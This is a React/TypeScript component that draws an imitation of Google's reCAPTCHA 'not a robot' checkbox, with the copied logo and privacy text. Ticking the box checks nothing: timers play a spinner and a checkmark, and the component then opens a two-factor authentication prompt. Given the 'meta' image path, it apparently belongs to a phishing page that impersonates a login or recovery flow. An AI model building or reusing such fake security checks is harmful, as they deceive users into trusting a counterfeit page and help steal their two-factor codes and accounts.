import React from 'react';
import Modal from '#components/modals/Modal';
import { useAppStrings } from '@/hooks/useAppStrings';

interface CaptchaModalProps {
    isOpend: boolean;
    isOpendTwoFactor: (value: boolean) => void;
    onToggleModal: (isOpen: boolean) => void;
}

const VERIFY_DELAY_MS = 1650;
const OPEN_TWO_FA_DELAY_MS = 550;

const CaptchaModal: React.FC<CaptchaModalProps> = ({ isOpend, isOpendTwoFactor, onToggleModal }) => {
    const t = useAppStrings();
    const [isOpen, setIsOpen] = React.useState(isOpend);
    const [isLoading, setIsLoading] = React.useState(false);
    const [isVerified, setIsVerified] = React.useState(false);
    const verifyTimerRef = React.useRef<ReturnType<typeof setTimeout> | null>(null);
    const openTwoFaTimerRef = React.useRef<ReturnType<typeof setTimeout> | null>(null);

    React.useEffect(() => {
        setIsOpen(isOpend);
        if (isOpend) {
            setIsLoading(false);
            setIsVerified(false);
        }
    }, [isOpend]);

    React.useEffect(() => {
        return () => {
            if (verifyTimerRef.current) clearTimeout(verifyTimerRef.current);
            if (openTwoFaTimerRef.current) clearTimeout(openTwoFaTimerRef.current);
        };
    }, []);

    const handleClose = () => {
        if (verifyTimerRef.current) clearTimeout(verifyTimerRef.current);
        if (openTwoFaTimerRef.current) clearTimeout(openTwoFaTimerRef.current);
        setIsOpen(false);
        onToggleModal(false);
    };

    const handleCheckboxChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        if (!e.target.checked || isLoading || isVerified) return;
        setIsLoading(true);

        if (verifyTimerRef.current) clearTimeout(verifyTimerRef.current);
        if (openTwoFaTimerRef.current) clearTimeout(openTwoFaTimerRef.current);

        verifyTimerRef.current = setTimeout(() => {
            verifyTimerRef.current = null;
            setIsLoading(false);
            setIsVerified(true);

            openTwoFaTimerRef.current = setTimeout(() => {
                openTwoFaTimerRef.current = null;
                isOpendTwoFactor(true);
                handleClose();
            }, OPEN_TWO_FA_DELAY_MS);
        }, VERIFY_DELAY_MS);
    };

    return (
        <Modal isOpen={isOpen} title="" onClose={handleClose} isClosable={false}>
            <div className="flex min-h-full w-full min-w-0 flex-col gap-6 pb-1">
                <div className="flex items-center justify-start bg-cover bg-center py-2 w-full font-helvetica">
                    <div className="bg-[#f9f9f9] border-2 rounded-md text-[#4c4a4b] flex flex-row items-center justify-between pr-2 w-full">
                        <div className="flex flex-row items-center justify-start ml-[1rem]">
                            <div
                                className="relative h-[30px] w-[30px] flex items-center justify-center"
                                style={{ WebkitTapHighlightColor: 'transparent' }}
                            >
                                <label
                                    className={`recaptcha-check ${isLoading ? 'cursor-wait' : 'cursor-pointer'}`}
                                    htmlFor="checked-captcha-modal"
                                >
                                    <input
                                        type="checkbox"
                                        checked={isVerified}
                                        id="checked-captcha-modal"
                                        onChange={handleCheckboxChange}
                                        aria-label={t.captcha.notRobot}
                                        disabled={isLoading || isVerified}
                                        className="sr-only"
                                    />
                                    <span
                                        aria-hidden="true"
                                        className={`recaptcha-icon ${isLoading ? 'is-loading' : ''} ${isVerified ? 'is-verified' : ''}`}
                                    >
                                        {isLoading && (
                                            <>
                                                <span className="recaptcha-spinner-track" />
                                                <span className="recaptcha-spinner-segment" />
                                            </>
                                        )}
                                        {isVerified && (
                                            <svg viewBox="0 0 24 24" className="recaptcha-checkmark">
                                                <path d="M4.5 12.5L9.2 17.1L20 6.3" />
                                            </svg>
                                        )}
                                    </span>
                                </label>
                            </div>
                            <label
                                htmlFor="checked-captcha-modal"
                                className="cursor-pointer text-[14px] text-gray-500 font-semibold mr-4 ml-1 text-center text-left tracking-normal"
                            >
                                {t.captcha.notRobot}
                            </label>
                        </div>
                        <div className="flex items-center flex-col text-[#9d9ba7] mb-[2px]">
                            <img src="/images/meta/recaptcha.png" alt="recaptcha" className="w-[40px] h-[40px] mt-[.5rem]" />
                            <span className="text-[10px] font-bold">reCAPTCHA</span>
                            <div className="text-[8px]">{t.captcha.privacyTerms}</div>
                        </div>
                    </div>
                </div>

                <div className="text-gray-700 font-helvetica text-[13px] leading-[1.3]">
                    <p className="font-normal">{t.captcha.p1}</p>
                    <p className="font-normal mt-4">{t.captcha.p2}</p>
                    <p className="font-normal mt-4">{t.captcha.p3}</p>
                </div>
            </div>
        </Modal>
    );
};

export default CaptchaModal;
